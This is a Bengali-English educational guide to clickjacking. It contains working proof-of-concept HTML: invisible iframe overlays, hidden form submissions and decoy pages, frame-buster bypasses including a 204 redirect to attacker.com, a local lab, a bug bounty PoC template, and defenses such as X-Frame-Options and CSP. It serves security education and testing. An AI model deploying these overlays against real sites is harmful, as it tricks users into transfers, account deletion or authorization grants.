# 🖱️ Clickjacking — Detailed Study Notes

> **Audience:** Cybersecurity students, ethical hackers, bug bounty hunters
> **Disclaimer:** শুধুমাত্র authorized system এবং lab environment এ practice করো।

---

## 📚 Table of Contents

1. [Concept — Clickjacking কী?](#1-concept--clickjacking-কী)
2. [কীভাবে কাজ করে — Visual ব্যাখ্যা](#2-কীভাবে-কাজ করে--visual-ব্যাখ্যা)
3. [Attack Techniques](#3-attack-techniques)
   - [UI Redressing](#31-ui-redressing)
   - [Invisible Frames](#32-invisible-frames)
   - [Button/Form Hijacking](#33-buttonform-hijacking)
4. [Advanced Bypass Techniques](#4-advanced-bypass-techniques)
   - [onBeforeUnload Event Abuse](#41-onbeforeunload-event-abuse)
   - [IE8 XSS Filter Bypass](#42-ie8-xss-filter-bypass)
   - [Chrome XSSAuditor Bypass](#43-chrome-xssauditor-bypass)
5. [Challenge — Code Analysis](#5-challenge--code-analysis)
6. [Practical Lab — নিজে বানাও](#6-practical-lab--নিজে-বানাও)
7. [Testing Methodology — কীভাবে Find করবে?](#7-testing-methodology--কীভাবে-find-করবে)
8. [Defense — Prevention Techniques](#8-defense--prevention-techniques)
9. [Bug Bounty Impact Assessment](#9-bug-bounty-impact-assessment)
10. [References](#10-references)

---

## 1. Concept — Clickjacking কী?

**Clickjacking** (aka **UI Redressing**) হলো একটা attack যেখানে attacker user কে ধোঁকা দিয়ে এমন কিছুতে click করায় যেটা user মনে করছে legitimate, কিন্তু আসলে সে ভিন্ন কিছুতে click করছে।

```
Real-World Analogy:
┌─────────────────────────────────────────────────────────┐
│                                                         │
│  ধরো একটা কাঁচের দরজায় একটা poster লাগানো আছে।       │
│  Poster এ লেখা: "এখানে press করো — বিনামূল্যে iPhone"  │
│                                                         │
│  কিন্তু কাঁচের পেছনে আসল বোতাম আছে:                  │
│  "আমার সব টাকা transfer করো"                           │
│                                                         │
│  তুমি poster এর বোতাম press করলে,                      │
│  আসলে কাঁচের পেছনের বোতামে press হচ্ছে!               │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### Clickjacking দিয়ে কী কী করা যায়?

| Action                                   | Impact                    |
| ---------------------------------------- | ------------------------- |
| "Delete my account" button এ click করানো | Account deletion          |
| Bank transfer button এ click করানো       | Fund theft                |
| Like/Share করানো                         | Social media manipulation |
| Malicious file download করানো            | Malware install           |
| Webcam/Microphone enable করানো           | Privacy violation         |
| Password field এ type করানো              | Credential theft          |
| Admin settings পরিবর্তন করানো            | Privilege escalation      |

---

## 2. কীভাবে কাজ করে — Visual ব্যাখ্যা

```
User যা দেখে:           আসলে কী আছে:
┌──────────────────┐    ┌──────────────────────────────────┐
│                  │    │ Legitimate Bank Site (iframe)     │
│  🎉 WIN A PRIZE! │    │  ┌────────────────────────────┐  │
│                  │    │  │                            │  │
│  [CLICK HERE]    │    │  │  Transfer $500 to:         │  │
│                  │    │  │  Account: attacker_acct    │  │
└──────────────────┘    │  │                            │  │
                        │  │  [CONFIRM TRANSFER] ← ← ←  │  │
  ↑ User এটা দেখছে     │  │   ↑ এই বোতামের উপরে       │  │
                        │  │     "CLICK HERE" overlay!  │  │
                        │  └────────────────────────────┘  │
                        └──────────────────────────────────┘

Layer Stack (Z-index):
  Bottom Layer (z-index: 1):  Legitimate site iframe (transparent/invisible)
  Top Layer    (z-index: 2):  Fake "Win a Prize" page (what user sees)

User clicks "CLICK HERE" → actually clicks "CONFIRM TRANSFER"!
```

### CSS দিয়ে কীভাবে layers তৈরি হয়

```css
/* Attacker এর malicious page */

/* Layer 1: Victim site iframe — invisible কিন্তু clickable */
iframe#victim {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  opacity: 0; /* ← invisible! কিন্তু exists এবং clickable */
  z-index: 1; /* ← নিচের layer */
  border: none;
}

/* Layer 2: Fake content — user দেখছে এটা */
div#fake-content {
  position: absolute;
  top: 200px; /* ← iframe এর button এর exact position এ align করো */
  left: 300px;
  z-index: 2; /* ← উপরের layer — user দেখে */
  cursor: pointer;
}
```

---

## 3. Attack Techniques

### 3.1 UI Redressing

সবচেয়ে common technique। একটা transparent `<div>` দিয়ে পুরো page cover করে।

```html
<!DOCTYPE html>
<html>
  <head>
    <style>
      body {
        margin: 0;
        font-family: Arial;
      }

      /* Visible fake page — user এটা দেখে */
      #fake-page {
        position: relative;
        z-index: 2;
        background: white;
        padding: 50px;
        text-align: center;
      }

      /* Invisible overlay — actual clickable area */
      #overlay {
        opacity: 0; /* ← পুরোপুরি transparent */
        position: absolute;
        top: 0;
        left: 0;
        height: 100%;
        width: 100%;
        z-index: 3; /* ← fake-page এর উপরে */
      }
    </style>
  </head>
  <body>
    <!-- User যা দেখে -->
    <div id="fake-page">
      <h1>🎁 Free iPhone Giveaway!</h1>
      <p>Click the button below to claim your prize!</p>
      <button style="padding: 15px 30px; font-size: 18px; background: green; color: white;">
        CLAIM NOW
      </button>
    </div>

    <!-- Invisible overlay — victim site iframe -->
    <div id="overlay">
      <iframe
        src="https://victim-bank.com/transfer?amount=1000&to=attacker"
        width="100%"
        height="100%"
      >
      </iframe>
    </div>
  </body>
</html>
```

**Attack এর key:** `opacity: 0` মানে invisible কিন্তু **click events এখনো কাজ করে!**

```
opacity: 0    → invisible + clickable  ✅ (attacker এর choice)
visibility: hidden → invisible + NOT clickable ❌
display: none → invisible + NOT clickable ❌
```

---

### 3.2 Invisible Frames

Zero-dimension iframe ব্যবহার করে malicious content load করা।

```html
<!-- Method 1: Zero size iframe -->
<iframe
  src="https://malicious-site.com/steal-data"
  style="opacity: 0; height: 0; width: 0; border: none;"
>
</iframe>

<!-- Method 2: Off-screen iframe -->
<iframe
  src="https://victim.com/delete-account"
  style="position: absolute; top: -9999px; left: -9999px;"
>
</iframe>
```

**কী load হচ্ছে iframe এ?**

```
Scenario: Attacker এর iframe এ victim এর bank site load হচ্ছে
  → Victim already logged in (cookie আছে)
  → Browser automatically send করে cookies (same-site=None হলে)
  → iframe এ victim এর authenticated session দেখাচ্ছে
  → Attacker manipulate করতে পারছে
```

---

### 3.3 Button/Form Hijacking

User visible button click করলে hidden form submit হয়।

```html
<!DOCTYPE html>
<html>
  <body>
    <!-- User এটা দেখে এবং click করে -->
    <button onclick="fakeAction()">✅ Yes, I agree to Terms & Conditions</button>

    <!-- Hidden form — user জানে না এটা আছে -->
    <form
      action="https://victim.com/api/delete-account"
      method="POST"
      id="hidden-form"
      style="display: none;"
    >
      <input type="hidden" name="confirm" value="yes" />
      <input type="hidden" name="user_id" value="TARGET_USER_ID" />
    </form>

    <script>
      function fakeAction() {
        // User মনে করছে terms agree করছে
        // আসলে account delete হচ্ছে!
        document.getElementById('hidden-form').submit()
      }
    </script>
  </body>
</html>
```

**আরেকটা example — Drag-and-Drop Clickjacking:**

```html
<!-- User কে drag করতে বলা হচ্ছে, কিন্তু আসলে text copy হচ্ছে -->
<style>
  #drag-target {
    /* invisible frame এর উপরে positioned */
    opacity: 0.01; /* প্রায় invisible */
    position: absolute;
    top: 100px;
    left: 200px;
  }
</style>

<!-- invisible iframe তে victim এর page -->
<iframe
  src="https://victim.com/profile"
  style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"
></iframe>

<!-- Decoy: user কে drag করতে বলা হচ্ছে -->
<p>Drag the token below to the "input box":</p>
<div id="drag-target" draggable="true">DRAG ME</div>
```

---

## 4. Advanced Bypass Techniques

### 4.1 onBeforeUnload Event Abuse

কিছু target site **frame busting** code ব্যবহার করে — মানে সে detect করার চেষ্টা করে যে সে iframe এর ভেতরে আছে কিনা:

```javascript
// Victim site এর frame busting code:
if (top !== self) {
  top.location = self.location // iframe থেকে বের হয়ে যাও!
}
```

**Attacker এর bypass:**

```html
<!-- Attacker এর page -->
<h1>www.fake-lottery.com</h1>
<script>
  // onbeforeunload দিয়ে navigation block করো
  window.onbeforeunload = function () {
    return 'Are you sure you want to leave this amazing prize page?'
    // Browser user কে confirm dialog দেখাবে
    // User "Cancel" click করলে iframe থেকে বের হওয়া বন্ধ হয়!
  }
</script>

<!-- Frame busting code এই iframe এ কাজ করবে না -->
<iframe src="https://victim-site.com/transfer"></iframe>
```

**Advanced — User interaction ছাড়া bypass (204 No Content trick):**

```javascript
// Attacker এর page
var prevent_bust = 0

window.onbeforeunload = function () {
  prevent_bust++ // navigation attempt count করো
}

setInterval(function () {
  if (prevent_bust > 0) {
    prevent_bust -= 2
    // 204 No Content page এ redirect করো
    // এই page navigation টা cancel করে দেয়!
    window.top.location = 'https://attacker.com/204.php'
  }
}, 1) // প্রতি millisecond এ check করো
```

```php
<?php
// 204.php — attacker এর server এ
// এই response navigation request কে effectively cancel করে
header("HTTP/1.1 204 No Content");
?>
```

```
How it works:
  Victim's frame bust: top.location = self.location (navigation attempt!)
         ↓
  onbeforeunload fires → prevent_bust++
         ↓
  setInterval: prevent_bust > 0 → redirect to 204.php
         ↓
  204 No Content: navigation canceled!
         ↓
  Victim site stuck in iframe forever!
```

---

### 4.2 IE8 XSS Filter Bypass

IE8 এর XSS filter টা frame busting scripts কে false positive হিসেবে detect করে disable করে দিতে পারে।

```
Victim site এর frame busting code:
<script>
  if (top != self) {
    top.location = self.location;
  }
</script>

Attacker এর iframe URL:
  → script এর beginning টা URL parameter এ inject করো

<iframe src="http://victim.com/page?param=<script>if">
```

```
What IE8 XSS filter does:
  URL parameter: <script>if
  Page source:   <script>if (top != self) { ... }

  Filter thinks: "URL parameter matches page script → XSS attempt!"
  Filter action: Disables ALL inline scripts on the page
  Result:        Frame busting code disabled! Victim stays in iframe.
```

---

### 4.3 Chrome XSSAuditor Bypass

Chrome এর filter specific script snippet disable করতে পারে।

```html
<!-- Attacker encodes the frame busting code in the URL -->
<iframe src="http://victim.com/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D">
</iframe>

<!-- URL decoded: if(top != self) { top.location=self.location; } -->
<!-- Chrome XSSAuditor: URL contains script → disable that script! -->
<!-- Frame busting disabled while rest of page works normally -->
```

---

## 5. Challenge — Code Analysis

এই code টা analyze করো:

```html
<div style="position: absolute; opacity: 0;">
  <iframe src="https://legitimate-site.com/login" width="500" height="500"> </iframe>
</div>
<button
  onclick="document.getElementsByTagName('iframe')[0]
                          .contentWindow.location='malicious-site.com';"
>
  Click me
</button>
```

### Analysis

```
Step 1: কী আছে এখানে?
  ✅ একটা invisible div (opacity: 0)
  ✅ ভেতরে legitimate-site.com/login এর iframe
  ✅ একটা "Click me" button

Step 2: Button click করলে কী হয়?
  document.getElementsByTagName('iframe')[0]  → প্রথম iframe select করো
  .contentWindow.location = 'malicious-site.com'  → iframe কে malicious site এ redirect করো

Step 3: Vulnerability কী?
  ❌ Problem 1: Iframe invisible (opacity: 0) — user দেখতে পাচ্ছে না
  ❌ Problem 2: Button click করলে iframe redirect হয় malicious site এ
  ❌ Problem 3: JavaScript দিয়ে iframe এর location change করা হচ্ছে

  এটা একটা combined attack:
  1. User legitimate-site এ login করার কথা ভাবছে
  2. Button click করলে iframe malicious site এ যায়
  3. User invisible iframe এ malicious site এ land করে
  4. Phishing বা malware delivery হতে পারে

Step 4: Missing Protection?
  ❌ No X-Frame-Options header → legitimate site iframe এ load হচ্ছে
  ❌ No CSP frame-ancestors → block করছে না
  ❌ No frame busting code → detect করছে না
```

---

## 6. Practical Lab — নিজে বানাও

### Lab Setup (Parrot OS / Kali তে)

```bash
# Simple Python HTTP server দিয়ে lab চালাও
mkdir clickjacking-lab && cd clickjacking-lab

# Victim site (legitimate looking)
cat > victim.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Victim Bank - Transfer</title></head>
<body style="font-family: Arial; padding: 50px;">
  <h1>🏦 Secure Bank Portal</h1>
  <p>Welcome, John Doe</p>
  <form action="/transfer" method="POST">
    <p>Transfer Amount: $500</p>
    <p>To Account: 12345678</p>
    <button type="submit"
            style="padding: 10px 20px; background: blue; color: white; border: none; cursor: pointer;">
      CONFIRM TRANSFER
    </button>
  </form>
</body>
</html>
EOF

# Attacker's malicious page
cat > attacker.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
  <title>WIN FREE iPHONE 15 PRO!</title>
  <style>
    body { margin: 0; background: #ff6b6b; font-family: Arial; }

    /* Victim iframe — invisible */
    #victim-frame {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0.00001; /* নিচের comment দেখো */
      /* Testing এর জন্য 0.5 রাখো — তাহলে দেখতে পাবে overlay কীভাবে align হচ্ছে */
      z-index: 1;
      border: none;
    }

    /* Fake page — user এটা দেখে */
    #fake-page {
      position: relative;
      z-index: 2;
      text-align: center;
      padding: 100px 50px;
      pointer-events: none; /* click events নিচের layer এ যাক */
    }

    #fake-button {
      position: absolute;
      /* এই position victim site এর "CONFIRM TRANSFER" button এর উপরে হতে হবে */
      top: 300px;
      left: 50%;
      transform: translateX(-50%);
      padding: 15px 40px;
      font-size: 20px;
      background: #ffd700;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      z-index: 2;
      pointer-events: none; /* click টা নিচে যাক */
    }
  </style>
</head>
<body>
  <!-- Layer 1: Victim site (invisible) -->
  <iframe id="victim-frame" src="victim.html"></iframe>

  <!-- Layer 2: Fake content (visible) -->
  <div id="fake-page">
    <h1 style="color: white; font-size: 48px;">🎉 CONGRATULATIONS!</h1>
    <h2 style="color: yellow;">You've been selected!</h2>
    <p style="color: white; font-size: 20px;">Click below to claim your FREE iPhone 15 Pro!</p>
  </div>

  <!-- Fake button positioned EXACTLY over victim's real button -->
  <button id="fake-button">🎁 CLAIM YOUR PRIZE NOW!</button>

</body>
</html>
EOF

# Server চালাও
python3 -m http.server 8080
# Browser এ: http://localhost:8080/attacker.html
```

### Testing: Overlay Alignment করার technique

```javascript
// Browser console এ run করো opacity 0.5 রেখে
// Victim button এর exact position বের করো:

// attacker.html এ iframe কে semi-transparent করো temporarily:
document.getElementById('victim-frame').style.opacity = '0.5'

// তারপর victim iframe এর button এর position দেখো
// F12 → Elements → victim iframe → button element → inspect
// Box model থেকে top/left values নাও → fake-button এ apply করো
```

### Lab 2: Testing with Clickjack Tool

```bash
# machine1337/clickjack tool দিয়ে automated test
git clone https://github.com/machine1337/clickjack
cd clickjack
python3 clickjack.py

# অথবা manual test:
# একটা simple HTML file বানাও:
cat > test-clickjack.html << 'EOF'
<html>
<head><title>Clickjacking Test</title></head>
<body>
<iframe src="TARGET_URL_HERE" width="500" height="500"></iframe>
<p>If the site loads above in the iframe — it's VULNERABLE to clickjacking!</p>
<p>If you see an error or blank — it's PROTECTED (X-Frame-Options or CSP active)</p>
</body>
</html>
EOF

# File browser এ open করো এবং iframe load হয় কিনা দেখো
```

### Lab 3: PortSwigger Web Security Academy

```
Free labs:
  1. Basic clickjacking with CSRF token bypass
     URL: https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected

  2. Clickjacking with form input data prefilled from a URL parameter
     URL: https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input

  3. Clickjacking with a frame buster script
     URL: https://portswigger.net/web-security/clickjacking/lab-frame-buster-script

  4. Exploiting clickjacking vulnerability to trigger DOM-based XSS
     URL: https://portswigger.net/web-security/clickjacking/lab-dom-xss

  5. Multistep clickjacking
     URL: https://portswigger.net/web-security/clickjacking/lab-multistep
```

---

## 7. Testing Methodology — কীভাবে Find করবে?

### Step 1: Basic Clickjacking Test

```bash
# Burp Suite দিয়ে:
# 1. Target site এ যাও
# 2. Response headers দেখো

# Command line দিয়ে:
curl -I https://target.com | grep -i "x-frame\|content-security"

# Expected output যদি protected হয়:
X-Frame-Options: DENY
# অথবা:
Content-Security-Policy: frame-ancestors 'none';

# যদি এই headers না থাকে → potentially vulnerable!
```

### Step 2: Manual iframe Test

```html
<!-- test.html বানাও locally -->
<html>
  <body>
    <h1>Clickjacking Vulnerability Test</h1>
    <iframe src="https://target.com/sensitive-action" width="800" height="600"> </iframe>
    <p>Result: If site loads = VULNERABLE, if error = PROTECTED</p>
  </body>
</html>
```

### Step 3: Sensitive Action Identification

```
Target site এ এই pages খোঁজো যেগুলো clickjacking এ valuable:
  ✅ Account settings page
  ✅ Password change page
  ✅ Delete account page
  ✅ Transfer/payment page
  ✅ Social media post/like/share
  ✅ Email/notification settings
  ✅ OAuth authorization page
  ✅ Admin actions
```

### Step 4: PoC (Proof of Concept) বানাও

```html
<!-- Bug Bounty PoC template -->
<!DOCTYPE html>
<html>
  <head>
    <title>Clickjacking PoC — [Target Company]</title>
    <style>
      #target_website {
        position: relative;
        width: 128px;
        top: 276px; /* ← victim button এর position এ adjust করো */
        left: 60px;
        opacity: 0.00001; /* invisible */
        z-index: 2;
      }
      #decoy_website {
        position: absolute;
        width: 300px;
        top: 400px;
        left: 60px;
        z-index: 1;
      }
    </style>
  </head>
  <body>
    <div id="decoy_website">
      <h3>Click here to claim your reward!</h3>
      <button>CLAIM NOW</button>
    </div>
    <iframe id="target_website" src="https://TARGET.com/SENSITIVE-ACTION" width="300" height="400">
    </iframe>
  </body>
</html>
```

---

## 8. Defense — Prevention Techniques

### Method 1: X-Frame-Options Header ✅ (সবচেয়ে simple)

```apache
# Apache (.htaccess বা httpd.conf):
Header always append X-Frame-Options DENY          # কেউ iframe করতে পারবে না
Header always append X-Frame-Options SAMEORIGIN    # শুধু same domain পারবে

# Nginx (nginx.conf):
add_header X-Frame-Options "DENY";
add_header X-Frame-Options "SAMEORIGIN";
```

```javascript
// Node.js / Express:
const helmet = require('helmet')
app.use(helmet.frameguard({ action: 'deny' }))

// অথবা manually:
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY')
  next()
})
```

```
X-Frame-Options Values:
  DENY         → কোনো iframe এ load হবে না
  SAMEORIGIN   → শুধু same origin iframe এ load হবে
  ALLOW-FROM   → নির্দিষ্ট URL থেকে iframe allow (deprecated!)
```

### Method 2: Content Security Policy (CSP) ✅ (Modern, Recommended)

```html
<!-- HTML meta tag: -->
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none';" />

<!-- Specific domain allow করতে: -->
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self' https://trusted.com;" />
```

```apache
# Apache:
Header always set Content-Security-Policy "frame-ancestors 'none';"

# Nginx:
add_header Content-Security-Policy "frame-ancestors 'none';";
```

```javascript
// Node.js:
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "frame-ancestors 'none'")
  next()
})
```

### Method 3: JavaScript Frame Busting (Weak — easily bypassed!)

```javascript
// ⚠️ এটা weak defense — onBeforeUnload দিয়ে bypass হয়
// কিন্তু defense-in-depth এর অংশ হিসেবে রাখা যায়

if (top !== self) {
  // আমরা iframe এর ভেতরে আছি!
  top.location = self.location // বের হয়ে যাও
}

// Better version:
if (window.self !== window.top) {
  document.body.style.display = 'none' // page hide করো
  top.location = self.location
}
```

### Method 4: SameSite Cookie Attribute ✅

```
যদি cookies SameSite=Strict বা Lax থাকে,
তাহলে cross-origin iframe এ authenticated session কাজ করবে না।

Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

### Defense Comparison

```
┌────────────────────────┬───────────┬────────────────────────────────┐
│ Method                 │ Strength  │ Notes                          │
├────────────────────────┼───────────┼────────────────────────────────┤
│ X-Frame-Options        │ ✅ Good   │ Simple, widely supported       │
│ CSP frame-ancestors    │ ✅✅ Best │ Modern, flexible, recommended  │
│ JS Frame Busting       │ ⚠️ Weak   │ Bypassable, use as supplement  │
│ SameSite Cookies       │ ✅ Good   │ Reduces impact, not complete   │
└────────────────────────┴───────────┴────────────────────────────────┘
```

---

## 9. Bug Bounty Impact Assessment

```
Clickjacking severity depends on WHAT action can be clickjacked:

🔴 Critical / High:
  → Account deletion
  → Fund transfer / payment
  → Password change
  → OAuth authorization (account takeover possible)
  → Admin privilege grant

🟠 Medium:
  → Email/notification settings change
  → Profile information modification
  → Social media post/share on user's behalf
  → Premium feature toggle

🟡 Low:
  → Like/follow/vote actions
  → Non-sensitive settings changes

🔵 Informational (usually out of scope):
  → Login page clickjacking (usually no real impact without session)
  → Static/public pages
```

```
Common Bug Bounty Program Exclusions:
  ❌ Login page without any sensitive action
  ❌ Pages that don't perform any action
  ❌ Self-only impact

Write your report with:
  1. Affected URL
  2. What action is clickjackable
  3. PoC HTML file (attach করো)
  4. Steps to reproduce
  5. Impact assessment
  6. Recommended fix
```

---

## 10. References

| Resource                   | Link                                                                                                                                                                           |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| PayloadsAllTheThings       | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking)                                                                                         |
| PortSwigger Clickjacking   | [Web Security Academy](https://portswigger.net/web-security/clickjacking)                                                                                                      |
| OWASP Clickjacking         | [OWASP](https://owasp.org/www-community/attacks/Clickjacking)                                                                                                                  |
| OWASP Testing Guide        | [Testing for Clickjacking](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/09-Testing_for_Clickjacking) |
| MDN X-Frame-Options        | [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)                                                                                               |
| MDN CSP frame-ancestors    | [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)                                                                       |
| machine1337/clickjack tool | [GitHub](https://github.com/machine1337/clickjack)                                                                                                                             |

---

> ✅ **Next Topic Suggestions:**
>
> - `CORS Misconfiguration/README.md` — Cross-origin attacks (closely related)
> - `Cross-Site Request Forgery/README.md` — CSRF (same attack surface)
> - `XSS Injection/README.md` — Client-side attacks family
> - `Tabnabbing/README.md` — আরেকটা UI deception attack

> ⚠️ **Ethical Reminder:** Clickjacking PoC শুধুমাত্র Bug Bounty program এর scope এর মধ্যে, authorized pentest এ, বা নিজের lab এ test করো।
